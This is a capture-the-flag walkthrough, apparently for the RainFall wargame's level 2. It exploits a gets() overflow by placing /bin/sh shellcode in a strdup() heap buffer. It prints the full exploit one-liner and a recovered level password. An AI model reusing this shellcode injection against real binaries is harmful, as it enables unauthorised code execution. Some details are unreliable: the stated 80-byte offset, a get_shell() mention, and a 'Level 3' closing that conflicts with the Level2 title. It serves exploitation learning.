# Level2

## Objective

The goal of Level 2 is to escalate from `level2` to `level3` by exploiting a buffer overflow vulnerability in the `level2` binary. By the end, you should be able to retrieve the password for `level3`.

---

## Step 1: Examine the Binary

After switching to `level2`:

```bash
level2@RainFall:~$ ls
level2
```

Running the binary with some test input:

```bash
level2@RainFall:~$ ./level2
bjr
level2@RainFall:~$ ./level2
blablibloublu
level2@RainFall:~$
```

> **Observation**: The program take an input and quit, suggesting a **buffer overflow** ??.

---

## Step 2: Investigate the Code Behavior

By disassembling the main we find a function called `p()`, using again the disass cmd we find that the function uses `gets()` to read user input, which means there's a overflow vulnerability.

```bash
Dump of assembler code for function main:
    0x08048545 <+6>:     call   0x80484d4 <p>
Dump of assembler code for function p:
    0x080484ed <+25>:    call   0x80483c0 <gets@plt>
```

But here's the problem, the stack isn't usable this time to overflow.
<+39> - <+44> : Execute a logical AND on eax then compare it to "0xb0000000". 
This check is made to be sure we don't overwrite the return address to an address on the stack.

```bash
Dump of assembler code for function p:
   0x080484fb <+39>:    and    eax,0xb0000000
   0x08048500 <+44>:    cmp    eax,0xb0000000
```

The point is to use a different way to override... Maybe the HEAP ?
The Heap overflow exists and needs a malloc to be executed. We're lucky we found with ltrace a `strdup()` using a malloc.
Everything given to the `strdup()` is stored thanks to the malloc directly to the heap. The whole point here is to give `strdup()` a shellcode to execute with the syscall 
execve directly inside !

---

## Step 3: Find the Offset

We need to determine at which point our input overwrites the saved return address.

### 3.1 Using a Pattern

```bash
level2@RainFall:~$ gdb ./level2
(gdb) run $(python -c '"Aa0Aa1Aa2..."')
```

When the program crashes, we check the value of `EIP`:

```bash
(gdb) info registers eip
eip            0x37634136
```

Now we find the exact offset:

in ASCII translate to 0x36 0x41 0x63 0x37 meaning 6Ac7 here.

> The return address is overwritten after **80 bytes**.

---

## Step 4: So what's the expected input?

To exploit this binary, we provide three parts in our input:

1. **Shellcode** – a small sequence of instructions that executes `/bin/sh`.
2. **Padding** – filler bytes (`"A" * 59` here) to reach the saved return address on the stack.
3. **Return address** – overwritten with `0x0804a008`, which points to the buffer where our shellcode is stored.

When the function returns, execution jumps into our injected shellcode, giving us a shell.

```bash
level2@RainFall:~$ python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "Q" * 59 + "\x08\xa0\x04\x08"' > /tmp/exploit
level2@RainFall:~$ cat /tmp/exploit - | ./level2
j
 XRh//shh/bin1̀QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
whoami
level3
cat /home/user/level3/.pass  
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

---

We successfully executed `get_shell()` and obtained a shell as `level3`.

---

**End of Level 3 Walkthrough**




